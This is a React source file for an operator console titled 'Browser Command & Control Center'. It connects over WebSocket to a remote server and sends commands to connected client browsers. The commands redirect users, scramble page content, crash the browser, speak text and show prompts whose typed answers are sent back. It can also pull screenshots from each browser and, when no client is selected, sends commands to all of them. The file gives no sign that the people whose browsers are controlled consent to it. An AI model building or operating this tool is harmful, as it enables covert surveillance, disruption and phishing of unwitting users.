import { useState, useEffect, useRef, useCallback } from 'react';
import styles from '@/app/admin/AdminPage.module.css'; // Make sure this path is correct

const AdminPanel = () => {
  const WEBSOCKET_URL = 'wss://admin-client.deno.dev';

  // --- State Management ---
  const [isConnected, setIsConnected] = useState(false);
  const [clients, setClients] = useState(new Map());
  const [selectedClients, setSelectedClients] = useState(new Set());
  const [logs, setLogs] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [fullscreenImage, setFullscreenImage] = useState(null);
  
  const socketRef = useRef(null);

  // --- Helper Functions ---
  const addLog = useCallback((prefix, message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prevLogs => [{ timestamp, prefix, message, type }, ...prevLogs]);
  }, []);

  // --- Message Handling ---
  const handleSocketMessage = useCallback((message) => {
    const { type, id, data } = message;
    
    switch (type) {
      case 'client_list':
        setClients(new Map(data.map(c => [c.id, c.info || { browser: 'N/A' }])));
        break;
      case 'client_connect':
        setClients(prev => new Map(prev).set(data.id, data.info));
        addLog('CLIENT', `Client connected: ${data.id}`, 'success');
        break;
      case 'client_disconnect':
        setClients(prev => {
          const newClients = new Map(prev);
          newClients.delete(id);
          return newClients;
        });
        setSelectedClients(prev => {
            const newSelection = new Set(prev);
            newSelection.delete(id);
            return newSelection;
        });
        addLog('CLIENT', `Client disconnected: ${id}`, 'error');
        break;
      case 'screenshot_response':
        setScreenshots(prev => [...prev, { clientId: id, imageData: data.image }]);
        addLog('RESPONSE', `Screenshot received from ${id}`, 'success');
        break;
      case 'action_confirmation':
        const logType = data.status === 'success' ? 'success' : 'error';
        addLog('CONFIRM', `[${id}] ${data.action} -> ${data.details}`, logType);
        break;
      // NEW: Handle responses from popups
      case 'confirm_response':
        addLog('RESPONSE', `[${id}] responded to confirm: ${data.value ? 'OK' : 'Cancel'}`, 'success');
        break;
      case 'prompt_response':
        const responseText = data.value === null ? 'Cancelled' : `"${data.value}"`;
        addLog('RESPONSE', `[${id}] responded to prompt: ${responseText}`, 'success');
        break;
      default:
        addLog('UNKNOWN', `Received unknown message type: ${type}`);
    }
  }, [addLog]);

  // --- WebSocket Connection Logic ---
  useEffect(() => {
    const connect = () => {
      if (socketRef.current && socketRef.current.readyState === WebSocket.OPEN) return;
      
      const socket = new WebSocket(WEBSOCKET_URL);
      socketRef.current = socket;

      socket.onopen = () => {
        setIsConnected(true);
        socket.send(JSON.stringify({ type: 'admin_hello' }));
        addLog('SYSTEM', 'Connected to server.', 'success');
      };

      socket.onclose = () => {
        setIsConnected(false);
        setClients(new Map());
        setSelectedClients(new Set());
        addLog('SYSTEM', 'Disconnected. Retrying...', 'error');
        setTimeout(connect, 5000);
      };

      socket.onerror = () => {
        addLog('SYSTEM', 'WebSocket error.', 'error');
        socket.close();
      };

      socket.onmessage = (event) => {
        handleSocketMessage(JSON.parse(event.data));
      };
    };

    connect();

    return () => {
      if (socketRef.current) socketRef.current.close();
    };
  }, [addLog, handleSocketMessage]);

  // --- Client Selection Handlers ---
  const handleClientSelection = (clientId) => {
    setSelectedClients(prev => {
      const newSelection = new Set(prev);
      if (newSelection.has(clientId)) {
        newSelection.delete(clientId);
      } else {
        newSelection.add(clientId);
      }
      return newSelection;
    });
  };

  const handleSelectAll = () => {
    setSelectedClients(new Set(clients.keys()));
  };

  const handleSelectNone = () => {
    setSelectedClients(new Set());
  };

  // --- Action Sending Function ---
  const sendAction = useCallback((actionType, payload = {}) => {
    if (!isConnected || !socketRef.current) {
      addLog('SYSTEM', 'Cannot send action: Not connected.', 'error');
      return;
    }

    let targetClientIds = Array.from(selectedClients);
    if (targetClientIds.length === 0) {
        targetClientIds = Array.from(clients.keys());
        if (targetClientIds.length === 0) {
            addLog('SYSTEM', 'No clients to send action to.', 'error');
            return;
        }
        addLog('SYSTEM', 'No clients selected. Sending to ALL.', 'info');
    }

    // Get values from inputs if needed
    if (actionType === 'redirect') payload.url = document.getElementById('redirect-url')?.value;
    if (actionType === 'new_tab') payload.url = document.getElementById('newtab-url')?.value;
    if (actionType === 'text_to_speech') payload.text = document.getElementById('tts-input')?.value;
    
    // NEW: Get values for popups
    if (actionType === 'alert') payload.message = document.getElementById('alert-message')?.value || 'Alert!';
    if (actionType === 'confirm') payload.message = document.getElementById('confirm-message')?.value || 'Please confirm.';
    if (actionType === 'prompt') {
        payload.message = document.getElementById('prompt-message')?.value || 'Please enter a value:';
        payload.minLength = parseInt(document.getElementById('prompt-min')?.value || '0', 10);
        payload.maxLength = parseInt(document.getElementById('prompt-max')?.value || '100', 10);
    }

    const message = {
      type: 'command',
      action: actionType,
      targetClientIds,
      payload,
    };

    socketRef.current.send(JSON.stringify(message));
    addLog('COMMAND', `Sent '${actionType}' to ${targetClientIds.length} client(s).`, 'info');
  }, [isConnected, clients, selectedClients, addLog]);

  // --- Render Logic ---
  const onlineClients = Array.from(clients.entries());

  return (
    <>
      {fullscreenImage && (
        <div className="fullscreen-overlay" onClick={() => setFullscreenImage(null)}>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={fullscreenImage} alt="Fullscreen Screenshot" /> 
          <button className={`${styles.btn} ${styles.btnSecondary}`}>Close</button>
        </div>
      )}

      <div className={styles.adminPanelContainer}>
        <header className={styles.panelHeader}>
          <div className={styles.headerTitle}>
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="m9 12 2 2 4-4"></path></svg>
            <div><h1>Admin Control Panel</h1><p>Browser Command & Control Center</p></div>
          </div>
          <div className={`${styles.statusBadge} ${isConnected ? styles.statusConnected : styles.statusDisconnected}`}>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              {isConnected ? <path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/> : <path d="m2 2 20 20M12.41 6.75 13 2l-2.43 2.92M18.57 12.91 21 10h-5.34M8 8.33V7l-3.21 4.39"/>}
            </svg>
            <span>{isConnected ? 'Connected' : 'Disconnected'}</span>
          </div>
        </header>

        <div className={styles.mainGrid}>
          <div className={styles.mainContent}>
            <div className={`${styles.section} ${styles.actionsGrid}`}>
              <div className={styles.card}>
                <h3 className={styles.cardHeader}>Navigation</h3>
                <div className={styles.cardContent}>
                  <input type="text" id="redirect-url" placeholder="Redirect URL..." className={styles.input} />
                  <button onClick={() => sendAction('redirect')} className={`${styles.btn} ${styles.btnPrimary}`}>Redirect</button>
                  <input type="text" id="newtab-url" placeholder="New Tab URL..." className={styles.input} />
                  <button onClick={() => sendAction('new_tab')} className={`${styles.btn} ${styles.btnPrimary}`}>New Tab</button>
                </div>
              </div>
              <div className={`${styles.card} ${styles.cardColSpan2}`}>
                <h3 className={styles.cardHeader}>Page Manipulation</h3>
                <div className={styles.buttonGroup}>
                  <button onClick={() => sendAction('toggle_edit')} className={`${styles.btn} ${styles.btnSecondary}`}>Toggle Edit</button>
                  <button onClick={() => sendAction('replace_images')} className={`${styles.btn} ${styles.btnSecondary}`}>Replace Imgs</button>
                  <button onClick={() => sendAction('scramble_content')} className={`${styles.btn} ${styles.btnSecondary}`}>Scramble Text</button>
                  <button onClick={() => sendAction('chaos_mode')} className={`${styles.btn} ${styles.btnSecondary}`}>Chaos Mode</button>
                </div>
                <div className={styles.buttonGroup}>
                  <button onClick={() => sendAction('fat_cat')} className={`${styles.btn} ${styles.btnWarning}`}>Release The Cat</button>
                  <button onClick={() => sendAction('crash_browser')} className={`${styles.btn} ${styles.btnDanger}`}>Crash Browser</button>
                </div>
              </div>
            </div>

            {/* NEW: JavaScript Popups Card */}
            <div className={styles.section}>
                <h2 className={styles.sectionHeader}>JavaScript Popups</h2>
                <div className={styles.advancedActionsGrid}>
                    <div className={styles.cardContent}>
                        <label>Alert</label>
                        <input type="text" id="alert-message" placeholder="Alert message..." className={styles.input} />
                        <button onClick={() => sendAction('alert')} className={`${styles.btn} ${styles.btnSecondary}`}>Send Alert</button>
                    </div>
                    <div className={styles.cardContent}>
                        <label>Confirm</label>
                        <input type="text" id="confirm-message" placeholder="Confirm message..." className={styles.input} />
                        <button onClick={() => sendAction('confirm')} className={`${styles.btn} ${styles.btnSecondary}`}>Send Confirm</button>
                    </div>
                    <div className={`${styles.cardContent} ${styles.cardColSpan2}`}>
                        <label>Prompt with Validation</label>
                        <input type="text" id="prompt-message" placeholder="Prompt message..." className={styles.input} />
                        <div className={styles.buttonGroup}>
                            <input type="number" id="prompt-min" placeholder="Min Chars (e.g., 5)" className={styles.input} />
                            <input type="number" id="prompt-max" placeholder="Max Chars (e.g., 50)" className={styles.input} />
                        </div>
                        <button onClick={() => sendAction('prompt')} className={`${styles.btn} ${styles.btnSecondary}`}>Send Prompt</button>
                    </div>
                </div>
            </div>

            <div className={styles.section}>
              <h2 className={styles.sectionHeader}>Advanced Actions</h2>
              <div className={styles.advancedActionsGrid}>
                <div className={styles.cardContent}>
                  <label>Text-to-Speech</label>
                  <input type="text" id="tts-input" placeholder="Enter text to speak..." className={styles.input} />
                  <button onClick={() => sendAction('text_to_speech')} className={`${styles.btn} ${styles.btnPrimary}`}>Speak on Client</button>
                </div>
                <div className={styles.cardContent}>
                  <label>Screenshots</label>
                  <div className={styles.buttonGroup}>
                    <button onClick={() => sendAction('request_screenshot')} className={`${styles.btn} ${styles.btnSecondary}`}>Request</button>
                    {screenshots.length > 0 && (
                      <button onClick={() => setScreenshots([])} className={`${styles.btn} ${styles.btnDanger}`}>Clear</button>
                    )}
                  </div>
                  {screenshots.length > 0 && (
                    <div className="screenshot-list">
                      {screenshots.map((shot, index) => (
                        <div key={index} className="screenshot-item">
                          {/* eslint-disable-next-line @next/next/no-img-element */}
                          <img src={shot.imageData} alt={`Screenshot from ${shot.clientId}`} className="screenshot-thumbnail" />
                          <div className="screenshot-info">
                            <span>From: {shot.clientId}</span>
                            <button onClick={() => setFullscreenImage(shot.imageData)} className="fullscreen-button">Fullscreen</button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>

          <div className={styles.sidebar}>
            <div className={styles.section}>
              <h2 className={styles.sectionHeader}>Statistics</h2>
              <div className={styles.statBox}>
                  <span>Online Clients:</span>
                  <span className={styles.statValue}>{clients.size}</span>
              </div>
            </div>
            <div className={styles.section}>
              <div className={styles.clientListHeader}>
                <h2 className={styles.sectionHeader} style={{borderBottom: 'none', marginBottom: 0}}>Clients</h2>
                <div className={styles.clientListControls}>
                  <button onClick={handleSelectAll}>All</button>
                  <button onClick={handleSelectNone}>None</button>
                </div>
              </div>
              <ul className={styles.onlineList}>
                {onlineClients.length > 0 ? (
                  onlineClients.map(([id, info]) => (
                    <li key={id}>
                      <input 
                        type="checkbox" 
                        className={styles.clientCheckbox}
                        checked={selectedClients.has(id)}
                        onChange={() => handleClientSelection(id)}
                      />
                      <span className={styles.onlineIndicator}>●</span>
                      <label className={styles.onlineName} onClick={() => handleClientSelection(id)}>{id}</label>
                      <span className={styles.onlineUsername}>{info.browser}</span>
                    </li>
                  ))
                ) : (
                  <p className={styles.noItemsText}>No clients connected.</p>
                )}
              </ul>
            </div>
          </div>
        </div>

        <div className={`${styles.section} ${styles.consoleCard}`}>
          <h2 className={styles.sectionHeader}>Console Log</h2>
          <div className={styles.detailsContent}>
            <pre>
              {logs.map((log, index) => (
                <div key={index}>
                  <span style={{color: '#888'}}>{log.timestamp} </span>
                  <strong style={{color: log.type === 'success' ? '#2dd4bf' : log.type === 'error' ? '#ef4444' : '#60a5fa'}}>{log.prefix}: </strong>
                  <span>{log.message}</span>
                </div>
              ))}
            </pre>
          </div>
        </div>
      </div>
      
      <style jsx>{`
        .fullscreen-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          background-color: rgba(0, 0, 0, 0.85);
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 1000;
          padding: 2rem;
        }
        .fullscreen-overlay img {
          max-width: 90%;
          max-height: 85%;
          object-fit: contain;
          border-radius: 8px;
          border: 2px solid #4a5568;
        }
        .fullscreen-overlay button {
          margin-top: 1rem;
        }
        .screenshot-list {
          margin-top: 1rem;
          max-height: 200px;
          overflow-y: auto;
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
          gap: 1rem;
        }
        .screenshot-item {
          position: relative;
          border-radius: 8px;
          overflow: hidden;
          border: 1px solid #4a5568;
        }
        .screenshot-thumbnail {
          display: block;
          width: 100%;
          height: 100px;
          object-fit: cover;
        }
        .screenshot-info {
          position: absolute;
          bottom: 0;
          left: 0;
          width: 100%;
          background: rgba(0,0,0,0.7);
          color: white;
          padding: 4px 8px;
          font-size: 0.75rem;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .fullscreen-button {
          background: #4a5568;
          color: white;
          border: none;
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 0.7rem;
          cursor: pointer;
        }
        .fullscreen-button:hover {
          background: #6b7280;
        }
      `}</style>
    </>
  );
};

export default AdminPanel;
